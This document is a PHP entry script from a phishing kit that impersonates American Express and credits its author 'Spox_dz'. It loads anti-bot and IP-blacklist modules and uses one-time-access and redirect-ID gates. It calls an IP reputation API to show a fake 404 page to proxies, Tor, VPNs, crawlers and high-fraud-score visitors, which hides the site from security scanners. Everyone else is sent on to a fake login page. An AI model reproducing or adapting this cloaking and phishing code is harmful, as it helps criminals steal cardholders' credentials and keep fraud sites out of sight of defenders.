<?php
session_start();

/**
 * DO NOT SELL THIS SCRIPT ! 
 * DO NOT CHANGE COPYRIGHT !
 * AMEX -
 * version 1.0
 * Https://facebook.com/hackeeeed.html
 * icq+teleg = @spoxcoder
 
###############################################
#$            C0d3d by Spox_dz               $#
#$   Recording doesn't  make you a Coder     $#
#$          Copyright 2019 AMEX              $#
###############################################

**/

include'Spox/config.php';
include'Spox/Anti/IP-BlackList.php';  
include'Spox/Anti/Bot-Crawler.php';
include'Spox/Anti/Bot-Spox.php';
include'Spox/Functions/Fuck-you.php'; 
include'Spox/Anti/Dila_DZ.php';

$AMEX_SESSION_SPOX = base64_encode(time().sha1($_SERVER['REMOTE_ADDR'].$_SERVER['HTTP_USER_AGENT']).md5(uniqid(rand(), true)));

if ($one_time_access=="yes") {

    if ( !file_exists('one_time.txt') ) {
 $deny_ips = array();
} else {
 $deny_ips = file('one_time.txt');
}

if ( (array_search($_SESSION['ip'], $deny_ips))!== FALSE ) {
        header("HTTP/1.0 404 Not Found");
        exit();
}
}

 if ($redirection=="yes") {
	if (isset($_GET['id'])) {
	 $id = isset($_GET['id']) ? trim(htmlentities($_GET['id'])):'';
	  if ($id !== $redirect) {
	  	exit(header("HTTP/1.0 404 Not Found"));
	  }
	}else{
		exit(header("HTTP/1.0 404 Not Found"));
	}
  }


if ($api_protection=="yes") {

		$ch=curl_init();
		curl_setopt($ch,CURLOPT_SSL_VERIFYPEER,false);
		curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
		curl_setopt($ch,CURLOPT_URL,"https://www.ipqualityscore.com/api/json/ip/".$Key."/".$_SESSION['ip']."");
		curl_setopt($ch,CURLOPT_CONNECTTIMEOUT,0);
		curl_setopt($ch,CURLOPT_TIMEOUT,400);
		$json=curl_exec($ch);

				$proxy = trim(strip_tags(get_string_between($json,'"proxy":',',"')));
				$tor = trim(strip_tags(get_string_between($json,'"tor":',',"')));
				$vpn = trim(strip_tags(get_string_between($json,'vpn":',',"')));
				$is_crawler = trim(strip_tags(get_string_between($json,'is_crawler":',',"')));
				$fraud_score = trim(strip_tags(get_string_between($json,'fraud_score":',',"')));
				$success = trim(strip_tags(get_string_between($json,'success":',',"')));

			$key = substr(sha1(mt_rand()),1,25);
			
			if ($anti_proxy=="yes") { if ($proxy == "true") {
				exit(header("HTTP/1.0 404 Not Found"));
				}
			} 

			if ($anti_tor=="yes") { if ($tor == "true") {
				exit(header("HTTP/1.0 404 Not Found"));
				}
			}

			if ($anti_vpn=="yes") { if ($vpn == "true") {
				exit(header("HTTP/1.0 404 Not Found"));
				}
			}

			if ($anti_web_crawler=="yes") { if ($is_crawler == "true") {
				exit(header("HTTP/1.0 404 Not Found"));
				}
			}

			if ($fraud_score >= "".$max_fraud_score."") {
				exit(header("HTTP/1.0 404 Not Found"));
			}

			if ($success == "false") {
				echo "<br><br><br><h3><center><h3 style='color:red'>YOUR API PROTECTION IS DEAD</h3> Please Contact Owner < Dila Belmili > On <a href='https://fb.com/hackeeeed.htmI' target='_blanc'> FACEBOOK</></center></h3>";
				}else{

			$_SESSION['AMEX_SPOX'] = $AMEX_SESSION_SPOX;
			exit(header("Location: login?amex_id=".$key."&country=".$_SESSION['country']."&iso=".$_SESSION['countrycode'].""));
			}
				

	}else{
		$_SESSION['AMEX_SPOX'] = $AMEX_SESSION_SPOX;
			exit(header("Location: login?amex_id=".$key."&country=".$_SESSION['country']."&iso=".$_SESSION['countrycode'].""));
	}

?>